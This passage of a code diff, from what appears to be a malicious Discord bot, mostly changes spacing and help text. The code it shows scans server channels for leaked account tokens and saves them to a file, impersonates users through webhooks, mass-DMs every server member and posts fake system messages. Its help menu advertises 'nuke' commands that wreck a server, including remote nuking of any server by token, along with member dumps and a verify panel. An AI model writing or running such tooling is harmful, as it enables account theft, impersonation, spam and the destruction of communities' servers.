     with open(file_path, "w", encoding="utf-8") as f:
         f.write(output)
@@ -1017,7 +1185,7 @@ async def lh_tokens(ctx, server_id: str = None):
         pass
 
     status = await ctx.send("🔍 Scanning channels for tokens...")
-    found = []
+    found  = []
 
     for channel in guild.text_channels:
         try:
@@ -1047,7 +1215,7 @@ async def lh_tokens(ctx, server_id: str = None):
             await ctx.send("🔍 Scan complete — no tokens found.", delete_after=10)
         return
 
-    output = f"Token Scan — {guild.name} ({guild.id})\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
+    output    = f"Token Scan — {guild.name} ({guild.id})\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
     file_path = f"/tmp/tokens_{guild.id}.txt"
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(output)
@@ -1061,9 +1229,9 @@ async def lh_tokens(ctx, server_id: str = None):
         await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  SOCIAL ENGINEERING
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 @bot.command(name="impersonate")
 async def impersonate(ctx, token_str: str = None, user_id: str = None, *, message: str = None):
@@ -1149,10 +1317,12 @@ async def massdm(ctx, token_str: str = None, server_id: str = None, *, message: 
     except Exception:
         pass
 
-    status_msg = await ctx.send(f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent")
+    status_msg = await ctx.send(
+        f"📬 Mass DMing **{guild.name}**... 0/{guild.member_count} sent"
+    )
 
     success = 0
-    failed = 0
+    failed  = 0
     for member in guild.members:
         if member.bot:
             continue
@@ -1214,9 +1384,9 @@ async def fake_system(ctx, *, message: str = None):
         await webhook.delete()
 
 
-# ════════════════════════════════════════════════════════════════
-#  HELP — DM only, self-deleting
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+#  HELP — DM only, trigger message deleted
+# ══════════════════════════════════════════════════════════════
 
 @bot.command(name="help")
 async def help_cmd(ctx):
@@ -1235,15 +1405,16 @@ async def help_cmd(ctx):
             "🔒 Admin   = server admin only\n"
             "```"
         ),
-        color=0x2b2d31
+        color=0x2b2d31,
+        timestamp=discord.utils.utcnow()
     )
     embed.add_field(
         name="━━━━━━ 💀 NUKE ━━━━━━",
         value=(
             "`!LH` — nuke current server 🔒\n"
             "`!LH GHOST` — clone top admin → nuke 🔒\n"
-            "`!LH EXEC <serverID> <token>` — remote nuke any server 🔑\n"
-            "`!LH ALL <token>` — nuke ALL servers bot is in 🔑\n"
+            "`!LH EXEC <serverID> <token>` — remote nuke 🔑\n"
+            "`!LH ALL <token>` — nuke ALL servers 🔑\n"
             "`!LH T` — generate a premium token ⭐\n"
             "`!LHP` — edit nuke config 🔑"
         ),
@@ -1253,10 +1424,11 @@ async def help_cmd(ctx):
         name="━━━━━━ 🛡️ ANTINUKE ━━━━━━",
         value=(
             "`!antinuke on` — enable protection 🔒\n"
-            "`!antinuke off` — disable protection ⭐ (premium only)\n"
+            "`!antinuke off` — disable protection ⭐\n"
             "`!antinuke status` — view status + whitelist 🔒\n"
-            "`!antinuke whitelist add <id>` — whitelist a user ⭐\n"
-            "`!antinuke whitelist remove <id>` — remove from whitelist ⭐"
+            "`!antinuke setup` — create log channel 🔒\n"
+            "`!antinuke whitelist add <id>` ⭐\n"
+            "`!antinuke whitelist remove <id>` ⭐"
         ),
         inline=False
     )
@@ -1264,38 +1436,36 @@ async def help_cmd(ctx):
         name="━━━━━━ 📡 INTEL ━━━━━━",
         value=(
             "`!LHSPY` — list every server bot is in ⭐\n"
-            "`!LHMEMBERS <serverID>` — full member dump as .txt ⭐\n"
-            "`!LHTOKENS <serverID>` — scan messages for tokens ⭐"
+            "`!LHMEMBERS <serverID>` — full member dump ⭐\n"
+            "`!LHTOKENS <serverID>` — scan for tokens ⭐"
         ),
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 🎭 SOCIAL ━━━━━━",
         value=(
-            "`!impersonate <token> <userID> <msg>` — webhook clone 🔑\n"
-            "`!massdm <token> <serverID> <msg>` — DM every member 🔑\n"
+            "`!impersonate <token> <userID> <msg>` 🔑\n"
+            "`!massdm <token> <serverID> <msg>` 🔑\n"
             "`!fake <msg>` — post as Discord system 🔒"
         ),
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 🔐 VERIFY ━━━━━━",
-        value="`/setupverify` — post one-click verify panel 🔒",
+        value="`/setupverify` — post professional verify panel 🔒",
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 📬 DM ━━━━━━",
-        value="`/dm <msg> <count> [member|user_id] [delay]` — DM any user (max 200×)",
+        value="`/dm <msg> <count> [member|user_id] [delay]`",
         inline=False
     )
     embed.add_field(
         name="━━━━━━ 📊 INFO ━━━━━━",
-        value=(
-            "`/serverinfo` · `/userinfo @user` · `/poll <q>` · `/ping`"
-        ),
+        value="`/serverinfo` · `/userinfo @user` · `/poll <q>` · `/ping`",
         inline=False
     )
-    embed.set_footer(text="LH Clan Bot | Only you can see this")
+    embed.set_footer(text="LH Clan Bot | Only you can see this message")
 
     try:
         await ctx.author.send(embed=embed)
@@ -1309,9 +1479,9 @@ async def help_cmd(ctx):
             pass
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  DM
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 @bot.tree.command(name="dm", description="DM a user by @mention or ID")
 @app_commands.describe(
@@ -1348,7 +1518,7 @@ async def dm(
         return
 
     success = 0
-    failed = 0
+    failed  = 0
     for _ in range(count):
         try:
             await user.send(message)
@@ -1371,14 +1541,14 @@ async def dm(
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 #  INFO
-# ════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
 
 @bot.tree.command(name="serverinfo", description="Show server info")
 async def serverinfo(interaction: discord.Interaction):
     g = interaction.guild
-    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2)
+    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2, timestamp=discord.utils.utcnow())
     embed.set_thumbnail(url=g.icon.url if g.icon else None)
     embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
     embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
@@ -1391,7 +1561,7 @@ async def serverinfo(interaction: discord.Interaction):
 @bot.tree.command(name="userinfo", description="Show info about a user")
 @app_commands.describe(member="User to inspect")
 async def userinfo(interaction: discord.Interaction, member: discord.Member):
-    embed = discord.Embed(title=f"👤 {member}", color=member.color)
+    embed = discord.Embed(title=f"👤 {member}", color=member.color, timestamp=discord.utils.utcnow())
     embed.set_thumbnail(url=member.display_avatar.url)
     embed.add_field(name="ID",              value=str(member.id),                         inline=True)
     embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
@@ -1415,8 +1585,8 @@ async def poll(interaction: discord.Interaction, question: str):
 @bot.tree.command(name="ping", description="Check bot latency")
 async def ping(interaction: discord.Interaction):
     latency = round(bot.latency * 1000)
-    color = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
-    embed = discord.Embed(
+    color   = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
+    embed   = discord.Embed(
         title="🏓 Pong!",
         description=f"Latency: **{latency}ms**",
         color=color
